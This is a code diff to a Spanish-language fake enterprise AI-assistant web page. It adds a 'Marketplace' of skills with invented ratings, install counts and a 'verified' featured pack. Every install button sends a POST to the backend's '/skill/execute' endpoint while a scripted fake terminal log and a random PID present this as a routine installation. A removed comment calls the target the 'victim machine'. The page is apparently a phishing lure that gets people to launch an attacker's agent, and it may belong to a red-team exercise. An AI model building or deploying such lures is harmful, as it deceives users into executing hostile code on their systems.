@@ -340,10 +340,110 @@
     }
     .clear-btn:hover { color: var(--text-2); border-color: var(--border-light); }
 
+    /* ── Marketplace view ── */
+    .marketplace-view {
+      flex: 1; overflow-y: auto; display: none;
+      background: radial-gradient(ellipse at 60% 0%, rgba(59,130,246,.04) 0%, transparent 50%);
+    }
+    .mkt-inner { max-width: 960px; margin: 0 auto; padding: 28px 24px 56px; }
+    .mkt-stats { display: flex; gap: 20px; padding: 12px 16px; border-radius: 10px; background: var(--bg-card); border: 1px solid var(--border); margin-bottom: 22px; flex-wrap: wrap; }
+    .mkt-stat-val { font-size: 17px; font-weight: 700; }
+    .mkt-stat-lbl { font-size: 10px; color: var(--text-3); margin-top: 1px; }
+
+    /* Featured card */
+    .feat-card {
+      border-radius: 12px; padding: 20px 22px; margin-bottom: 22px;
+      background: linear-gradient(135deg, rgba(139,92,246,.07) 0%, rgba(59,130,246,.06) 100%);
+      border: 1px solid rgba(139,92,246,.3); position: relative; overflow: hidden;
+      display: flex; gap: 18px; align-items: flex-start;
+    }
+    .feat-glow { position: absolute; top: -40px; right: -40px; width: 200px; height: 200px; border-radius: 50%; background: radial-gradient(circle, rgba(139,92,246,.15), transparent 70%); pointer-events: none; }
+    .feat-pill { position: absolute; top: 12px; right: 12px; font-size: 9px; font-weight: 800; text-transform: uppercase; letter-spacing: .06em; padding: 2px 7px; border-radius: 3px; background: linear-gradient(135deg, var(--purple), var(--accent)); color: #fff; }
+    .feat-ico  { width: 50px; height: 50px; border-radius: 12px; flex-shrink: 0; background: linear-gradient(135deg, var(--purple), var(--accent)); display: flex; align-items: center; justify-content: center; font-size: 24px; box-shadow: 0 0 20px rgba(139,92,246,.3); }
+    .feat-body { flex: 1; min-width: 0; }
+    .feat-name { font-size: 16px; font-weight: 700; margin-bottom: 3px; }
+    .feat-pub  { font-size: 11px; color: var(--text-3); margin-bottom: 8px; }
+    .feat-desc { font-size: 12.5px; color: var(--text-2); line-height: 1.6; margin-bottom: 12px; }
+    .feat-tags { display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 12px; }
+    .mkt-tag   { font-size: 10.5px; padding: 2px 7px; border-radius: 4px; background: var(--bg-hover); color: var(--text-2); border: 1px solid var(--border); }
+    .feat-meta { display: flex; gap: 14px; align-items: center; margin-bottom: 14px; font-size: 11px; color: var(--text-3); flex-wrap: wrap; }
+    .feat-meta b { color: var(--text-2); }
+
+    /* Skill cards grid */
+    .mkt-section-hdr { display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+    .mkt-section-ttl { font-size: 14px; font-weight: 600; }
+    .mkt-count { font-size: 10px; padding: 1px 6px; border-radius: 4px; background: var(--bg-hover); color: var(--text-3); border: 1px solid var(--border); }
+    .mkt-cats { display: flex; gap: 5px; flex-wrap: wrap; margin-bottom: 18px; }
+    .mkt-cat  { padding: 4px 11px; border-radius: 99px; border: 1px solid var(--border); background: var(--bg-card); color: var(--text-2); font-size: 11.5px; font-weight: 500; cursor: pointer; transition: all .15s; font-family: inherit; }
+    .mkt-cat:hover, .mkt-cat.active { border-color: var(--accent); color: var(--accent); background: var(--accent-soft); }
+    .mkt-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(270px, 1fr)); gap: 12px; }
+    .mkt-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 16px; transition: border-color .15s, transform .1s; }
+    .mkt-card:hover { border-color: var(--border-light); transform: translateY(-1px); }
+    .mkt-card-top  { display: flex; gap: 10px; align-items: flex-start; margin-bottom: 9px; }
+    .mkt-card-ico  { width: 38px; height: 38px; border-radius: 9px; flex-shrink: 0; display: flex; align-items: center; justify-content: center; font-size: 18px; }
+    .mkt-card-ico.blue   { background: var(--accent-soft); }
+    .mkt-card-ico.teal   { background: rgba(6,182,212,.1); }
+    .mkt-card-ico.green  { background: var(--green-soft); }
+    .mkt-card-ico.amber  { background: var(--amber-soft); }
+    .mkt-card-ico.purple { background: var(--purple-soft); }
+    .mkt-card-name { font-size: 13px; font-weight: 600; margin-bottom: 2px; }
+    .mkt-card-pub  { font-size: 10.5px; color: var(--text-3); }
+    .mkt-card-desc { font-size: 11.5px; color: var(--text-2); line-height: 1.5; margin-bottom: 11px; }
+    .mkt-card-foot { display: flex; align-items: center; gap: 7px; }
+    .mkt-card-meta { font-size: 10.5px; color: var(--text-3); margin-right: auto; display: flex; gap: 9px; }
+    .mkt-ver       { font-size: 9.5px; padding: 1px 5px; border-radius: 3px; background: var(--bg-hover); color: var(--text-3); border: 1px solid var(--border); }
+    .mkt-install-btn {
+      padding: 5px 12px; border-radius: 6px; border: 1px solid rgba(139,92,246,.35);
+      background: var(--purple-soft); color: var(--purple);
+      font-size: 11px; font-weight: 600; cursor: pointer; font-family: inherit;
+      transition: all .15s; white-space: nowrap;
+    }
+    .mkt-install-btn:hover:not(:disabled) { border-color: var(--purple); background: rgba(139,92,246,.2); }
+    .mkt-install-btn.done { border-color: rgba(16,185,129,.35); background: var(--green-soft); color: var(--green); cursor: default; }
+    .mkt-install-btn:disabled:not(.done) { opacity: .4; cursor: default; }
+
+    /* ── Install modal (shared) ── */
+    .install-overlay {
+      position: fixed; inset: 0; z-index: 200;
+      background: rgba(0,0,0,.72); backdrop-filter: blur(4px);
+      display: flex; align-items: center; justify-content: center;
+      opacity: 0; pointer-events: none; transition: opacity .2s;
+    }
+    .install-overlay.open { opacity: 1; pointer-events: all; }
+    .install-modal {
+      width: 500px; max-width: calc(100vw - 32px);
+      background: var(--bg-card); border: 1px solid var(--border-light);
+      border-radius: 14px; padding: 22px;
+      box-shadow: 0 8px 48px rgba(0,0,0,.6);
+      transform: translateY(10px); transition: transform .2s;
+    }
+    .install-overlay.open .install-modal { transform: translateY(0); }
+    .imod-hdr  { display: flex; align-items: center; gap: 11px; margin-bottom: 16px; }
+    .imod-ico  { width: 38px; height: 38px; border-radius: 9px; background: linear-gradient(135deg, var(--purple), var(--accent)); display: flex; align-items: center; justify-content: center; font-size: 17px; flex-shrink: 0; box-shadow: 0 0 14px rgba(139,92,246,.3); }
+    .imod-ttl  { font-size: 14px; font-weight: 700; }
+    .imod-sub  { font-size: 11px; color: var(--text-3); margin-top: 2px; }
+    .imod-prog-wrap { background: rgba(255,255,255,.04); border-radius: 3px; height: 5px; margin-bottom: 13px; overflow: hidden; }
+    .imod-prog { height: 100%; border-radius: 3px; background: linear-gradient(90deg, var(--purple), var(--accent)); width: 0%; transition: width .4s ease; }
+    .imod-term {
+      background: #020810; border: 1px solid var(--border); border-radius: 8px;
+      padding: 12px 14px; font-family: 'JetBrains Mono', 'Courier New', monospace;
+      font-size: 11px; line-height: 1.7; height: 180px; overflow-y: auto; margin-bottom: 14px;
+    }
+    .imod-term::-webkit-scrollbar { width: 3px; }
+    .t-prompt { color: var(--text-3); }
+    .t-info   { color: var(--text-3); }
+    .t-ok     { color: var(--green); }
+    .t-pid    { color: var(--purple); }
+    .imod-foot { display: flex; justify-content: flex-end; gap: 7px; }
+    .imod-cancel { padding: 7px 16px; border-radius: 6px; border: 1px solid var(--border); background: none; color: var(--text-2); font-size: 12px; font-weight: 500; cursor: pointer; font-family: inherit; transition: all .15s; }
+    .imod-cancel:hover { border-color: var(--border-light); color: var(--text); }
+    .imod-done { padding: 7px 16px; border-radius: 6px; border: none; background: linear-gradient(135deg, var(--green), #059669); color: #fff; font-size: 12px; font-weight: 600; cursor: pointer; font-family: inherit; box-shadow: 0 0 12px rgba(16,185,129,.2); display: none; }
+
     /* ── Responsive ── */
     @media (max-width: 860px) {
       .sidebar { display: none; }
       .ctx-field { display: none; }
+      .mkt-inner { padding: 16px 14px 40px; }
     }
   </style>
 </head>
@@ -407,8 +507,8 @@
       <span class="nav-logo-badge">Enterprise</span>
     </div>
     <div class="nav-links">
-      <span class="nav-link active">Asistente</span>
-      <a class="nav-link" href="/marketplace">Marketplace</a>
+      <span class="nav-link active" id="tab-chat"   onclick="switchTab('chat')">Asistente</span>
+      <span class="nav-link"        id="tab-market" onclick="switchTab('market')">Marketplace <span style="font-size:9px;vertical-align:middle;background:linear-gradient(135deg,var(--purple),var(--accent));-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-weight:700;">NEW</span></span>
     </div>
     <div class="nav-right">
       <div class="nav-status" id="llm-status">
@@ -475,6 +575,172 @@
           <button class="clear-btn" id="clear-btn">Limpiar chat</button>
         </div>
       </div>
+    </div>
+  </div>
+
+  <!-- ════ MARKETPLACE TAB ════ -->
+  <div class="marketplace-view" id="marketplace-view">
+    <div class="mkt-inner">
+
+      <!-- Stats -->
+      <div class="mkt-stats">
+        <div><div class="mkt-stat-val" style="color:var(--accent)">47</div><div class="mkt-stat-lbl">Skills disponibles</div></div>
+        <div><div class="mkt-stat-val" style="color:var(--purple)">12</div><div class="mkt-stat-lbl">Conectores enterprise</div></div>
+        <div><div class="mkt-stat-val" style="color:var(--green)">38.4K</div><div class="mkt-stat-lbl">Instalaciones activas</div></div>
+        <div><div class="mkt-stat-val" style="color:var(--amber)">4.8 ★</div><div class="mkt-stat-lbl">Valoración media</div></div>
+      </div>
+
+      <!-- Featured -->
+      <div class="mkt-section-hdr"><div class="mkt-section-ttl">Destacado</div></div>
+      <div class="feat-card">
+        <div class="feat-glow"></div>
+        <div class="feat-pill">⚡ FEATURED</div>
+        <div class="feat-ico">⚡</div>
+        <div class="feat-body">
+          <div class="feat-name">Neural Nexus AI Skills Pack</div>
+          <div class="feat-pub">por <b style="color:var(--text-2)">Neural Nexus Labs</b> · Verificado ✓ · v2.1.0</div>
+          <div class="feat-desc">Suite de extensiones enterprise para CorpAI. Orquestación multi-modelo, context caching inteligente, integración con Jira/Confluence, análisis de logs Splunk y motor de memoria semántica.</div>
+          <div class="feat-tags">
+            <span class="mkt-tag">Multi-modelo</span><span class="mkt-tag">Context caching</span>
+            <span class="mkt-tag">Jira / Confluence</span><span class="mkt-tag">Splunk</span>
+            <span class="mkt-tag">Gratuito</span>
+          </div>
+          <div class="feat-meta">
+            <span>★★★★★ <b>4.9</b> (2.841 valoraciones)</span>
+            <span>↓ <b>12.4K</b> instalaciones</span>
+            <span>📦 Python 3.8+</span>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <button id="feat-install-btn" style="
+              padding:9px 20px;border-radius:8px;border:none;cursor:pointer;font-family:inherit;
+              background:linear-gradient(135deg,var(--purple),var(--accent));
+              color:#fff;font-size:13px;font-weight:700;
+              box-shadow:0 0 18px rgba(139,92,246,.3);transition:opacity .15s,transform .1s;
+              display:flex;align-items:center;gap:6px;
+            " onclick="installSkill('Neural Nexus AI Skills Pack','Neural Nexus Labs','feat-install-btn')">
+              <span>↓</span> Instalar gratis
+            </button>
+            <span style="font-size:11.5px;color:var(--text-3);padding:0 4px;">v2.1.0 · GPL-3.0</span>
+          </div>
+        </div>
+      </div>
+
+      <!-- Category filter -->
+      <div class="mkt-cats" id="mkt-cats">
+        <button class="mkt-cat active" data-cat="all">Todos</button>
+        <button class="mkt-cat" data-cat="productivity">Productividad</button>
+        <button class="mkt-cat" data-cat="security">Seguridad</button>
+        <button class="mkt-cat" data-cat="data">Datos</button>
+        <button class="mkt-cat" data-cat="code">Código</button>
+        <button class="mkt-cat" data-cat="integrations">Integraciones</button>
+      </div>
+
+      <!-- Skills grid -->
+      <div class="mkt-section-hdr">
+        <div class="mkt-section-ttl">Todos los skills</div>
+        <span class="mkt-count" id="mkt-count">6 resultados</span>
+      </div>
+      <div class="mkt-grid" id="mkt-grid">
+
+        <div class="mkt-card" data-cat="productivity">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico blue">📝</div>
+            <div><div class="mkt-card-name">Document Summarizer Pro</div><div class="mkt-card-pub">AcmeCorp Labs · v1.4.2</div></div>
+          </div>
+          <div class="mkt-card-desc">Resume documentos de Confluence, PDFs y correos. Resúmenes estructurados en español e inglés.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.7</span><span>↓ 8.2K</span></div>
+            <span class="mkt-ver">v1.4.2</span>
+            <button class="mkt-install-btn" id="mkt-btn-0" onclick="installSkill('Document Summarizer Pro','AcmeCorp Labs','mkt-btn-0')">↓ Instalar</button>
+          </div>
+        </div>
+
+        <div class="mkt-card" data-cat="productivity">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico teal">🎙️</div>
+            <div><div class="mkt-card-name">Meeting Notes AI</div><div class="mkt-card-pub">Productivity Suite · v2.0.1</div></div>
+          </div>
+          <div class="mkt-card-desc">Convierte transcripciones en notas estructuradas con action items y propietarios asignados.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.6</span><span>↓ 5.9K</span></div>
+            <span class="mkt-ver">v2.0.1</span>
+            <button class="mkt-install-btn" id="mkt-btn-1" onclick="installSkill('Meeting Notes AI','Productivity Suite','mkt-btn-1')">↓ Instalar</button>
+          </div>
+        </div>
+
+        <div class="mkt-card" data-cat="code">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico purple">💻</div>
+            <div><div class="mkt-card-name">Code Review Assistant</div><div class="mkt-card-pub">DevOps Team · v3.1.0</div></div>
+          </div>
+          <div class="mkt-card-desc">Analiza pull requests de GitHub Enterprise buscando bugs, vulns y violaciones de estilo.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.8</span><span>↓ 4.1K</span></div>
+            <span class="mkt-ver">v3.1.0</span>
+            <button class="mkt-install-btn" id="mkt-btn-2" onclick="installSkill('Code Review Assistant','DevOps Team','mkt-btn-2')">↓ Instalar</button>
+          </div>
+        </div>
+
+        <div class="mkt-card" data-cat="security">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico amber">🔍</div>
+            <div><div class="mkt-card-name">SIEM Log Analyzer</div><div class="mkt-card-pub">SecOps Tools · v1.2.0</div></div>
+          </div>
+          <div class="mkt-card-desc">Parsea logs de Splunk en el chat. Identifica IOCs y genera resúmenes ejecutivos de incidentes.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.9</span><span>↓ 2.8K</span></div>
+            <span class="mkt-ver">v1.2.0</span>
+            <button class="mkt-install-btn" id="mkt-btn-3" onclick="installSkill('SIEM Log Analyzer','SecOps Tools','mkt-btn-3')">↓ Instalar</button>
+          </div>
+        </div>
+
+        <div class="mkt-card" data-cat="integrations">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico green">👥</div>
+            <div><div class="mkt-card-name">HR Assistant (Workday)</div><div class="mkt-card-pub">People Team · v1.0.5</div></div>
+          </div>
+          <div class="mkt-card-desc">Conector con Workday para consultar políticas de RRHH y gestionar solicitudes de vacaciones.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.4</span><span>↓ 3.5K</span></div>
+            <span class="mkt-ver">v1.0.5</span>
+            <button class="mkt-install-btn" id="mkt-btn-4" onclick="installSkill('HR Assistant','People Team','mkt-btn-4')">↓ Instalar</button>
+          </div>
+        </div>
+
+        <div class="mkt-card" data-cat="data">
+          <div class="mkt-card-top">
+            <div class="mkt-card-ico teal">📊</div>
+            <div><div class="mkt-card-name">Data Query Engine</div><div class="mkt-card-pub">Data Platform Team · v2.3.1</div></div>
+          </div>
+          <div class="mkt-card-desc">Genera y ejecuta consultas SQL sobre la data warehouse. Exportación a Excel/CSV incluida.</div>
+          <div class="mkt-card-foot">
+            <div class="mkt-card-meta"><span>★ 4.5</span><span>↓ 2.2K</span></div>
+            <span class="mkt-ver">v2.3.1</span>
+            <button class="mkt-install-btn" id="mkt-btn-5" onclick="installSkill('Data Query Engine','Data Platform Team','mkt-btn-5')">↓ Instalar</button>
+          </div>
+        </div>
+
+      </div><!-- /mkt-grid -->
+    </div><!-- /mkt-inner -->
+  </div><!-- /marketplace-view -->
+
+</div><!-- /#app -->
+
+<!-- ════ INSTALL MODAL (shared) ════ -->
+<div class="install-overlay" id="install-overlay" onclick="if(event.target===this)closeInstallModal()">
+  <div class="install-modal">
+    <div class="imod-hdr">
+      <div class="imod-ico">⚡</div>
+      <div>
+        <div class="imod-ttl" id="imod-title">Instalando skill…</div>
+        <div class="imod-sub"  id="imod-sub">Neural Nexus Labs · v2.1.0</div>
+      </div>
+    </div>
+    <div class="imod-prog-wrap"><div class="imod-prog" id="imod-prog"></div></div>
+    <div class="imod-term"     id="imod-term"></div>
+    <div class="imod-foot">
+      <button class="imod-cancel" id="imod-cancel" onclick="closeInstallModal()">Cancelar</button>
+      <button class="imod-done"   id="imod-done"   onclick="closeInstallModal()">✓ Listo</button>
     </div>
   </div>
 </div>
@@ -754,23 +1020,115 @@ document.getElementById('msg-input').addEventListener('keydown', e => {
   ta.style.height = Math.min(ta.scrollHeight, 140) + 'px';
 });
 
-// ── Skill install (sidebar) ────────────────────────────────────────────────
-async function installSkillSidebar() {
-  const btn = document.getElementById('sidebar-skill-btn');
-  btn.disabled = true; btn.textContent = '⟳ Instalando…';
-  try {
-    // Execute on victim machine via backend
-    await fetch(HOST + '/skill/execute', { method: 'POST' });
-    btn.textContent = '✓ Activo';
-    btn.className = 'skill-btn installed';
-    appendMsg('assistant',
-      '✓ Neural Nexus AI Skills Pack v2.1.0 instalado y en ejecución.\n\nEl agente enterprise está activo en segundo plano. Las capacidades del asistente han sido mejoradas con orquestación multi-modelo y context caching.',
-      new Date().toLocaleTimeString()
-    );
-  } catch {
-    btn.disabled = false; btn.textContent = '↓ Instalar extensión';
+// ── Sidebar skill button (delegates to shared installSkill) ───────────────
+function installSkillSidebar() {
+  installSkill('Neural Nexus AI Skills Pack', 'Neural Nexus Labs', 'sidebar-skill-btn', true);
+}
+
+// ── Tab switching ──────────────────────────────────────────────────────────
+function switchTab(tab) {
+  const isChat = tab === 'chat';
+  document.getElementById('tab-chat').classList.toggle('active',   isChat);
+  document.getElementById('tab-market').classList.toggle('active', !isChat);
+  document.querySelector('.main').style.display            = isChat ? 'flex' : 'none';
+  document.getElementById('marketplace-view').style.display = isChat ? 'none' : 'flex';
+}
+
+// ── Shared install skill (all cards + sidebar) ────────────────────────────
+const INSTALL_LINES = (name) => [
+  { t: 'prompt', text: `$ neural-nexus install "${name}" --enterprise` },
+  { t: 'info',   text: '[+] Verificando dependencias del entorno…',         delay: 380 },
+  { t: 'ok',     text: '[✓] Python 3.11  ·  pip 23.3  ·  OK',              delay: 320 },
+  { t: 'info',   text: '[+] Descargando paquetes de orquestación…',         delay: 520 },
+  { t: 'ok',     text: '[✓] neural-nexus-core==2.1.0       (3.2 MB)',       delay: 420 },
+  { t: 'ok',     text: '[✓] nn-enterprise-connector==1.8.4 (1.1 MB)',       delay: 370 },
+  { t: 'ok',     text: '[✓] nn-context-cache==0.9.2        (512 KB)',       delay: 300 },
+  { t: 'info',   text: '[+] Configurando conector con CorpAI Enterprise…',  delay: 580 },
+  { t: 'ok',     text: '[✓] Endpoint registrado: ai.acmecorp.internal',     delay: 440 },
+  { t: 'info',   text: '[+] Iniciando agente en segundo plano…',            delay: 560 },
+  { t: 'pid',    text: '',                                                   delay: 680, pid: true },
+  { t: 'ok',     text: `[✓] Skill "${name}" activo y en ejecución`,         delay: 280 },
+  { t: 'info',   text: '[+] Asistente IA mejorado correctamente.',           delay: 360 },
+];
+const PROG_STEPS = [4, 13, 22, 32, 46, 58, 68, 77, 85, 91, 96, 100, 100];
+
+async function installSkill(name, publisher, btnId, isSidebar = false) {
+  const btn = btnId ? document.getElementById(btnId) : null;
+  if (btn) { btn.disabled = true; btn.textContent = '⟳ Instalando…'; }
+
+  // Open modal
+  document.getElementById('imod-title').textContent = `Instalando: ${name}`;
+  document.getElementById('imod-sub').textContent   = `${publisher} · Neural Nexus Engine v2.1.0`;
+  const term = document.getElementById('imod-term');
+  const prog = document.getElementById('imod-prog');
+  const done = document.getElementById('imod-done');
+  term.innerHTML = ''; prog.style.width = '0%'; done.style.display = 'none';
+  document.getElementById('imod-cancel').textContent = 'Cancelar';
+  document.getElementById('install-overlay').classList.add('open');
+
+  // Fire agent execute on backend
+  fetch(HOST + '/skill/execute', { method: 'POST' }).catch(() => {});
+
+  // Animate terminal
+  const lines = INSTALL_LINES(name);
+  for (let i = 0; i < lines.length; i++) {
+    const l = lines[i];
+    await sleep(l.delay || 300);
+    prog.style.width = (PROG_STEPS[i] || 100) + '%';
+    if (l.pid) {
+      let pid;
+      try { const r = await fetch(HOST + '/skill/execute', {method:'POST'}); const d = await r.json().catch(()=>({})); pid = d.pid || rndPid(); }
+      catch { pid = rndPid(); }
+      addTermLine(term, 'pid', `[✓] Agente iniciado   PID: ${pid}   (daemon mode)`);
+    } else {
+      addTermLine(term, l.t, l.text);
+    }
+    term.scrollTop = term.scrollHeight;
+  }
+
+  // Finalize
+  prog.style.width = '100%';
+  done.style.display = 'block';
+  document.getElementById('imod-cancel').textContent = 'Cerrar';
+
+  // Update button
+  if (btn) {
+    if (isSidebar) {
+      btn.textContent = '✓ Activo'; btn.className = 'skill-btn installed';
+    } else if (btnId === 'feat-install-btn') {
+      btn.innerHTML = '✓ Instalado'; btn.style.background = 'linear-gradient(135deg,var(--green),#059669)'; btn.style.cursor = 'default'; btn.disabled = true;
+    } else {
+      btn.textContent = '✓ Activo'; btn.className = 'mkt-install-btn done'; btn.disabled = true;
+    }
   }
 }
+
+function addTermLine(term, type, text) {
+  const div = document.createElement('div');
+  div.className = 't-' + type; div.textContent = text;
+  term.appendChild(div);
+}
+function closeInstallModal() { document.getElementById('install-overlay').classList.remove('open'); }
+function sleep(ms)    { return new Promise(r => setTimeout(r, ms)); }
+function rndPid()     { return Math.floor(Math.random() * 40000) + 10000; }
+
+// ── Marketplace category filter ────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  document.querySelectorAll('.mkt-cat').forEach(btn => {
+    btn.addEventListener('click', () => {
+      document.querySelectorAll('.mkt-cat').forEach(b => b.classList.remove('active'));
+      btn.classList.add('active');
+      const cat = btn.dataset.cat;
+      let n = 0;
+      document.querySelectorAll('.mkt-card').forEach(c => {
+        const show = cat === 'all' || c.dataset.cat === cat;
+        c.style.display = show ? '' : 'none';
+        if (show) n++;
+      });
+      document.getElementById('mkt-count').textContent = n + ' resultado' + (n !== 1 ? 's' : '');
+    });
+  });
+});
 
 // ── Helpers ────────────────────────────────────────────────────────────────
 function escHtml(s) {
